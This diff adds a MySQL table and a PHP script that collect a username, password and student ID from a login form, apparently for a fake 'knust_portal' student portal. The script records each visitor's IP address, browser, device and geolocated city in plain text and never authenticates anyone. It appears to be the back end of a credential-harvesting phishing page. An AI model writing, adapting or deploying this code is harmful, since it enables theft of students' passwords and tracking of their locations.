@@ -1,0 +1,92 @@
+CREATE TABLE student_logins (
+    id INT AUTO_INCREMENT PRIMARY KEY,
+    username VARCHAR(100),
+    password VARCHAR(255),
+    student_id VARCHAR(50),
+    ip_address VARCHAR(50),
+    device_type VARCHAR(50),
+    browser_type VARCHAR(50),
+    location VARCHAR(100),
+    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+);
+
+
+
+
+
+
+<?php
+// Database connection
+$host = "localhost";
+$user = "root";
+$pass = "";
+$dbname = "knust_portal";
+
+$conn = new mysqli($host, $user, $pass, $dbname);
+
+if ($conn->connect_error) {
+    die("Connection failed: " . $conn->connect_error);
+}
+
+// Collect form inputs
+$username   = $_POST['studentUsername'] ?? '';
+$password   = $_POST['Password'] ?? '';
+$studentId  = $_POST['StudentId'] ?? '';
+
+// Get IP address
+$ip = $_SERVER['REMOTE_ADDR'];
+
+// Get browser and device info
+$userAgent = $_SERVER['HTTP_USER_AGENT'];
+
+// Simple browser detection
+if (strpos($userAgent, 'Chrome') !== false) {
+    $browser = "Chrome";
+} elseif (strpos($userAgent, 'Firefox') !== false) {
+    $browser = "Firefox";
+} elseif (strpos($userAgent, 'Safari') !== false) {
+    $browser = "Safari";
+} elseif (strpos($userAgent, 'MSIE') !== false || strpos($userAgent, 'Trident') !== false) {
+    $browser = "Internet Explorer";
+} else {
+    $browser = "Other";
+}
+
+// Simple device detection
+if (preg_match('/mobile/i', $userAgent)) {
+    $device = "Mobile";
+} elseif (preg_match('/tablet/i', $userAgent)) {
+    $device = "Tablet";
+} else {
+    $device = "Desktop";
+}
+
+// Get location using IP (basic example with free API)
+$location = "Unknown";
+$ipInfo = @file_get_contents("http://ip-api.com/json/$ip");
+if ($ipInfo !== false) {
+    $ipData = json_decode($ipInfo, true);
+    if ($ipData && $ipData['status'] === 'success') {
+        $location = $ipData['city'] . ", " . $ipData['country'];
+    }
+}
+
+// Prepare SQL statement
+$stmt = $conn->prepare("INSERT INTO student_logins 
+    (username, password, student_id, ip_address, device_type, browser_type, location) 
+    VALUES (?, ?, ?, ?, ?, ?, ?)");
+
+$stmt->bind_param("sssssss", $username, $password, $studentId, $ip, $device, $browser, $location);
+
+if ($stmt->execute()) {
+    echo "Login data saved successfully.";
+} else {
+    echo "Error: " . $stmt->error;
+}
+
+$stmt->close();
+$conn->close();
+?>
+
+
+
